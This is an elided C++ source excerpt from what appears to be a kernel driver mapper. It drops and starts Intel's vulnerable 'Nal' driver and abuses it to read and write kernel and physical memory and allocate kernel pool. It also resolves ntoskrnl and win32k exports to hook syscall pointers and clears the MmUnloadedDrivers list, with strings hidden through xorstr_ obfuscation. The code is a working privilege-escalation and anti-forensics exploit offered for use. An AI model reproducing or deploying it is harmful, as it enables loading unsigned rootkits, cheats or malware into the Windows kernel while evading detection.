...
{
	const HANDLE file_handle = CreateFileW(xorstr_(L"\\\\.\\Nal"),
	                                       FILE_ANY_ACCESS,
	                                       0,
	                                       nullptr,
	                                       OPEN_EXISTING,
...
{
	std::cout << xorstr_("[<] Loading vulnerable driver") << std::endl;
	...
	{
		std::cout << xorstr_("[-] Failed to get temp path") << std::endl;
		return nullptr;
	}

	const std::string driver_path = std::string(temp_directory) + xorstr_("\\") + driver_name;
	std::remove(driver_path.c_str());

	if (!utils::CreateFileFromMemory(driver_path, reinterpret_cast<const char*>(intel_driver_resource::driver),
	                                 sizeof(intel_driver_resource::driver)))
	{
		std::cout << xorstr_("[-] Failed to create vulnerable driver file") << std::endl;
		return nullptr;
	}

	if (!service::RegisterAndStart(driver_path))
	{
		std::cout << xorstr_("[-] Failed to register and start service for the vulnerable driver") << std::endl;
		std::remove(driver_path.c_str());
		return nullptr;
	}

	return CreateFileW(xorstr_(L"\\\\.\\Nal"),
...
{
	std::cout << xorstr_("[<] Unloading vulnerable driver") << std::endl;

#ifdef CLEAR_MMUDRV_IN_LOADER
...
bool intel_driver::WriteToReadOnlyMemory(HANDLE device_handle, uint64_t address, void* buffer, uint32_t size)
{
	...
	{
		std::cout << xorstr_("[-] Failed to translate virtual address 0x") << reinterpret_cast<void*>(address) << std::
			endl;
		return false;
	}
	...
	{
		std::cout << xorstr_("[-] Failed to map IO space of 0x") << reinterpret_cast<void*>(physical_address) << std::
			endl;
		return false;
	}
	...
	if (!UnmapIoSpace(device_handle, mapped_physical_memory, size))
		std::cout << xorstr_("[!] Failed to unmap IO space of physical address 0x") << reinterpret_cast<void*>(
				physical_address)
			<< std::endl;
...
uint64_t intel_driver::AllocatePool(HANDLE device_handle, nt::POOL_TYPE pool_type, uint64_t size)
{
	...
	if (!kernel_ExAllocatePool)
		kernel_ExAllocatePool = GetKernelModuleExport(device_handle,
		                                              utils::GetKernelModuleAddress(xorstr_("ntoskrnl.exe")),
		                                              xorstr_("ExAllocatePool"));
...
bool intel_driver::FreePool(HANDLE device_handle, uint64_t address)
{
	...
	if (!kernel_ExFreePool)
		kernel_ExFreePool = GetKernelModuleExport(device_handle,
		                                          utils::GetKernelModuleAddress(xorstr_("ntoskrnl.exe")),
		                                          xorstr_("ExFreePool"));
...
uint64_t intel_driver::GetKernelModuleExport(HANDLE device_handle, uint64_t kernel_module_base,
                                             const std::string& function_name)
{
	...
	if (!ReadMemory(device_handle, kernel_module_base, &dos_header, sizeof(dos_header)) || dos_header.e_magic !=
		IMAGE_DOS_SIGNATURE ||
	...
	const auto export_data = reinterpret_cast<PIMAGE_EXPORT_DIRECTORY>(VirtualAlloc(
	...
	for (auto i = 0u; i < export_data->NumberOfNames; ++i)
	{
		...
		if (!_stricmp(current_function_name.c_str(), function_name.c_str()))
		{
			...
			if (function_address >= kernel_module_base + export_base && function_address <= kernel_module_base +
				export_base + export_base_size)
			{
				VirtualFree(export_data, 0, MEM_RELEASE);
...
bool intel_driver::GetNtGdiDdDDIReclaimAllocations2KernelInfo(HANDLE device_handle, uint64_t* out_kernel_function_ptr,
                                                              uint64_t* out_kernel_original_function_address)
{
	...
	{
		const uint64_t kernel_NtGdiDdDDIReclaimAllocations2 = GetKernelModuleExport(
			device_handle, utils::GetKernelModuleAddress(
				xorstr_("win32kbase.sys")),
			xorstr_("NtGdiDdDDIReclaimAllocations2"));

		if (!kernel_NtGdiDdDDIReclaimAllocations2)
		{
			std::cout << xorstr_("[-] Failed to get export win32kbase.NtGdiDdDDIReclaimAllocations2") << std::endl;
			return false;
		}
		...
		if (!ReadMemory(device_handle, kernel_function_ptr_offset_address, &function_ptr_offset,
		                sizeof(function_ptr_offset)))
			return false;

		kernel_function_ptr = kernel_NtGdiDdDDIReclaimAllocations2 + 0xB + function_ptr_offset;

		if (!ReadMemory(device_handle, kernel_function_ptr, &kernel_original_function_address,
...
bool intel_driver::GetNtGdiGetCOPPCompatibleOPMInformationInfo(HANDLE device_handle, uint64_t* out_kernel_function_ptr,
                                                               uint8_t* out_kernel_original_bytes)
{
	...
	{
		const uint64_t kernel_NtGdiGetCOPPCompatibleOPMInformation = GetKernelModuleExport(
			device_handle, utils::GetKernelModuleAddress(xorstr_("win32kfull.sys")), 
			xorstr_("NtGdiGetCOPPCompatibleOPMInformation"));

		if (!kernel_NtGdiGetCOPPCompatibleOPMInformation)
		{
			std::cout << xorstr_("[-] Failed to get export win32kfull.NtGdiGetCOPPCompatibleOPMInformation") << std::endl;
			return false;
		}

		kernel_function_ptr = kernel_NtGdiGetCOPPCompatibleOPMInformation;

		if (!ReadMemory(device_handle, kernel_function_ptr, kernel_original_jmp_bytes,
		                sizeof(kernel_original_jmp_bytes)))
			return false;
	}
...
bool intel_driver::ClearMmUnloadedDrivers(HANDLE device_handle)
{
	...
	NTSTATUS status = NtQuerySystemInformation(
		static_cast<SYSTEM_INFORMATION_CLASS>(nt::SystemExtendedHandleInformation), buffer, buffer_size, &buffer_size);
	...
	for (auto i = 0u; i < system_handle_inforamtion->HandleCount; ++i)
	{
		...
		if (current_system_handle.UniqueProcessId != reinterpret_cast<HANDLE>(static_cast<uint64_t>(
			GetCurrentProcessId())))
			continue;
